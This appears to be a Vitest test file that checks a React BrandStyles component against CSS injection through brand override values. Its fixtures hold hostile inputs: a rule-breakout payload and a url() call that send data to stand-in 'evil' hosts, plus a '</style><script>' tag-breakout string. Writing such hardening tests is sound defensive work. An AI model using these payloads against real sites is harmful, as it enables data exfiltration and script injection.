import { describe, it, expect } from 'vitest'
import { renderToStaticMarkup } from 'react-dom/server'
import { BrandStyles } from './BrandStyles'
import type { BrandConfig } from './schema'

/** Extract the inner CSS text of the emitted <style id="__brand"> block. */
function styleBody(config: BrandConfig): string {
  const html = renderToStaticMarkup(<BrandStyles config={config} />)
  const m = html.match(/<style id="__brand">([\s\S]*)<\/style>/)
  return m ? m[1] : ''
}

describe('BrandStyles CSS injection hardening', () => {
  it('emits exactly one rule and never lets an override value close it early', () => {
    const config: BrandConfig = {
      mode: 'dark',
      brand: { primary: '#FF8C00' },
      overrides: {
        // Classic rule-breakout + exfiltration payload.
        missionCard: { panel: 'red;}body{background:url(//evil/?c=x)}' },
      },
    }
    const body = styleBody(config)

    // Wrapper rule is intact: exactly one `{` and one `}` in the whole block.
    expect((body.match(/\{/g) ?? []).length).toBe(1)
    expect((body.match(/\}/g) ?? []).length).toBe(1)
    expect(body.startsWith('html[data-theme]{')).toBe(true)
    expect(body.endsWith('}')).toBe(true)
    // The injected selector/at-rule never materializes.
    expect(body).not.toContain('body{')
    expect(body).not.toContain(';}')
  })

  it('neutralizes a url() exfiltration payload in an override value', () => {
    const config: BrandConfig = {
      mode: 'dark',
      brand: { primary: '#FF8C00' },
      overrides: { heroBanner: { overlayGradient: 'url(//evil.example/?c=secret)' } },
    }
    const body = styleBody(config)
    // The security property is that no `url(` function survives, so the
    // browser never issues a request. The leftover host text is inert CSS
    // garbage (no function wrapper) and is acceptable.
    expect(body.toLowerCase()).not.toContain('url(')
  })

  it('strips tag-breakout characters from override values', () => {
    const config: BrandConfig = {
      mode: 'dark',
      brand: { primary: '#FF8C00' },
      overrides: { missionModal: { backdrop: '</style><script>alert(1)</script>' } },
    }
    const body = styleBody(config)
    expect(body).not.toContain('<')
    expect(body).not.toContain('>')
    expect(body).not.toContain('</style')
  })
})
